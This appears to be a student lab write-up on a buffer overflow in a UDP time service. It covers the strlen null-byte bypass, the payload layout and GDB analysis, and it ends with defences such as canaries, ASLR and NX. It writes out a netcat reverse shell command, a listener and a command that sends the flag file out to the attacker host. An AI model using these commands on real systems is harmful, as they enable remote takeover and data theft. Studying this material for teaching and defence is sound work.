# Cyber Security Lab 3
## Software Security - Buffer Overflow Attack

## Lab Description
The goal is to exploit a buffer overflow vulnerability in a vulnerable network service (timeservice) in order to achieve arbitrary code execution on a remote server and retrieve a secret file (flag.txt).

## Plan the attack strategy
### Step 1 Vulnerability Analysis of the timeservice.c
The timeservice.c file is a time server application that processes client requests to return the current system time. A primary vulnerability arises from improper handling of input data, particularly if fixed-size buffers are used without proper bounds checking. This can lead to stack-based buffer overflow attacks, allowing an attacker to overwrite the return address on the stack.

### Step 2 Shellcode Development
As both the attack and target machines have netcat installed with the -e option, a reverse shell shellcode can be developed in low-level assembly to exploit the vulnerability. This shellcode will establish a connection back to the attacker's machine, enabling remote control by executing the command "nc 10.12.55.3 4444 -e /bin/sh" at target machine.

### Step 3 Memory Layout Analysis with GDB
Using GDB to run timeservice.c on a local machine will allow for analysis of the stack frame, memory layout, and offset address of the return address in the stack frame.

### Step 4 Payload Construction
Based on the memory layout and the offset address for the return address, a Python script will be written to create a payload. This payload will consist of the shellcode and the address of the shellcode, which will overwrite the return address.

### Step 5 Test the attack at the chuck machine
Execute the attack using the timeservice application and the constructed payload on the local machine to fine-tune the payload layout.

### Step 6 Execute the attack with timservice in non-debug mode and then at the target machine
Once the payload layout is confirmed, execute the attack again using timeservice in a non-debug mode. Some adjustments to the payload data is necessary due to memory layout deviations across runs. Finally, perform the attack on the target machine and obtain the secret file (flag.txt).

## Analysis the vulnerability
A potential vulnerability may come from improper handling of input data, particularly if it utilizes fixed-size buffers without bounds checking. By studying the source code of timeservice.c, the following vulnerability for buffer overflow attack:

### 1. variable timebuf in function get_time and input variable msgbuf
The timebuf variable in the get_time function and the msgbuf input variable have sizes of 128 bytes (TIMEBUFSIZE=128) and 256 bytes (MSGBUFSIZE=256), respectively. This creates an opportunity for a buffer overflow attack. By injecting data exceeding 128 bytes through msgbuf into timebuf, an attacker can place shellcode in the stack memory and overwrite the return address with the location of the shellcode. Once executed, this shellcode can establish a reverse shell on the target machine.

### 2. Validation of buffer length in get_time function

The strlen function is used to check that the length of msgbuf does not exceed timebuf. This validation can be bypassed by inserting a null byte (0x00) before the length of 128. This manipulation makes it feasible to inject data beyond the intended boundaries.

## Reverse Shell and the Shell Code (shell_code.asm)
A reverse shell is a technique wherein exploited code causes a victim machine to initiate an outbound network connection back to an attacker, providing an interactive command shell. The shellcode using assembly code executes the following command in the stack memory of the target machine: nc 10.12.55.3 4444 -e /bin/sh

The purpose of the reverse shell shellcode within a buffer overflow attack is to turn control over the program's execution into a usable outcome. By establishing a remote interactive shell, it demonstrates full compromise of the vulnerable system

## Develop and debug using GDB (run_gdb.sh)
run gdb.sh is used to find the memory layout, location of return address in stack frame and offset of  the return address.

### 1. (gdb) info frame - Display information of the current stack frame
this command can find the value of the return address at "saved eip = 0x80495b9"

### 2. (gdb) x /250bx timebuf - examine 250 bytes of memory starting from timebuf
this command can locate and calculate the offset of the return address. The offset is used to build the payload data that can overwrites this address.

### 3. (gdb) layout src, layout asm, layout reg and stepi
these commands used to go through the values of registers and variables in studying the memory layout and running process of timeservice


## Create the payload and the layout (echo_payload.py, payload.txt)
this Python creates and output payload.txt with binary data:

* "0x90" NOP \*24
* shellcode (length 90)
* "0x00" \* 2 - bypass the length check of strlen function
* multiple return addresses of the shellcode (greater chance to overwrite the return address)

## Attack the time server in the chunk machine
Run the command to attack the timeservice
$nc -u 127.0.0.1 2222 < payload.txt

The payload will create a malicious input that overflows the vulnerable buffer and overwrites the return address, it also redirects execution to the shellcode. Padding will be used to reach the return address, and a new return address will be provided.   The attack will be done by sending the exploit to the timeservice on time via UDP and gaining remote shell access in order to retrieve flag.txt data.

## trial and error to handle the memory deviations
After re-compiled the timeservice using non-debug mode, some memory deviations were found:
Adjust the payload with the shellcode for every 4 bytes to each attempt then finally attack the timeservice and execute the shellcode.

## Obtain the secret file (flag.txt)
After gaining the remote shell control of the target machine using reverse shell

at chuck (attack machine)
$nc -lvp 4444

at time (target machine)
$nc 10.12.55.3 4444 -e /bin/sh

The flag.txt can be received from target machine with below commands
at chuck (attack machine)
$nc -lvp 4444 > flag.txt

at time (target machine)
$nc 10.12.55.3 4444 < \\home\\time\\flag.txt


## How to prevent buffer overflow attacks
Buffer overflow attacks occur when data exceeds the allocated buffer's size, potentially leading to shellcode execution and data overwrite. A number of strategies can be implemented to mitigate this risk, categorized into system-level and software-level techniques.

### System-Level Techniques
- Non-Executable Stack

  Description: Marks stack memory as non-executable, preventing execution of injected code.
  Implementation: enabled in modern CPUs, can mark segments of memory as non-executable.

- Stack Canaries
  Description: Places a small, known value (canary) just before the buffer on the stack. If this value is altered, the program recognizes a potential overflow and terminates.
  Implementation: Compiler flags can be set (e.g., using `-fstack-protector` in GCC) to enable canary checks.

- Stack Randomization
  Description: Shuffles the stack layout randomly to make it harder for attackers to predict memory addresses.
  Implementation: Changes the order or position of stack variables at runtime, often integrated with other techniques like ASLR.

- Address Space Layout Randomization (ASLR)
  Description: Randomizes the memory address space used by system and application processes, making it difficult for attackers to predict the location of critical data structures.
  Implementation: Usually a part of kernel-level security features in modern operating systems.

### Software-Level Techniques
- Input Length Checking
  Description: Validates the size of input before processing. If input length exceeds buffer size, the program denies the input or truncates it.
  Implementation:
  * Use functions that limit input size (e.g., `strncpy` instead of `strcpy`).
  * Implement explicit checks to ensure the data fits within the buffer's capacity.

- Safe Functions
  Description: Utilize safer functions and libraries that automatically manage buffer sizes and prevent overflows.
  Implementation: Use libraries designed to minimize risk, such as `safe-string` libraries that provide functions with built-in length checks.

Employing both system-level and software-level techniques creates multiple layers of defense, making it increasingly difficult for attackers to exploit vulnerabilities.

